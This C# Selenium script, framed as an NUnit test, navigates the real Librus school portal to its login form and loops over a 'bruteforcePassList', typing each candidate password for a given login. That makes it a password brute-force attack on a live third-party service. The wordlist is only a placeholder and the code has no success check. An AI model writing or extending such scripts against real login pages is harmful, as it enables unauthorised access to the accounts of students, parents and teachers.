using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using NUnit.Framework;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.DevTools.V121.Network;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.UI;


namespace SeleniumWebDriverProject.Testy
{
    internal class SeleniumTests
    {
        int czasPrzelaczania = 500; //1000 = sekunda
        int czekajpowpisaniu = 1200;
        string login = "";

        [Test]

        public void Main()
        {
            IWebDriver driver = new ChromeDriver();
            Actions actions = new Actions(driver);

            driver.Manage().Window.Maximize();
            driver.Navigate().GoToUrl("https://portal.librus.pl/");

            Thread.Sleep(czasPrzelaczania);

            driver.FindElement(By.XPath("/html/body/div[2]/div[2]/div/div/div[1]/div[2]/div/div/button[2]")).Click();
            Thread.Sleep(czasPrzelaczania);
            driver.FindElement(By.XPath("/html/body/div[1]/header/div/div[3]/button[3]")).Click();
            Thread.Sleep(czasPrzelaczania);
            driver.FindElement(By.XPath("/html/body/div[1]/header/div/div[3]/div[2]/nav/a[1]")).Click();
            Thread.Sleep(czasPrzelaczania);
            driver.FindElement(By.XPath("/html/body/div[1]/div[3]/div/div/div[2]/button[2]")).Click();
            Thread.Sleep(czasPrzelaczania);
            driver.FindElement(By.XPath("/html/body/nav/div/div[1]/div/div[2]/a[3]")).Click();
            Thread.Sleep(czasPrzelaczania);
            driver.FindElement(By.XPath("/html/body/nav/div/div[1]/div/div[2]/div/a[2]")).Click();
            Thread.Sleep(czasPrzelaczania);
            actions.SendKeys(login).KeyUp(Keys.Control).Build().Perform();
            
            
            //driver.Close();

            foreach (string pass in bruteforcePassList)
            {
                actions.SendKeys(Keys.Enter).Perform();
                Thread.Sleep(czasPrzelaczania);
                actions.SendKeys(pass).KeyUp(Keys.Control).Build().Perform();
                actions.SendKeys(Keys.Enter).Perform();
                Thread.Sleep(czekajpowpisaniu);
                actions.SendKeys(Keys.Tab).Perform();
                actions.SendKeys(Keys.Tab).Perform();
            }


        }


        public string[] bruteforcePassList = {
            "a",
            "b" ,
            "c",
            "d",

        };
    }
}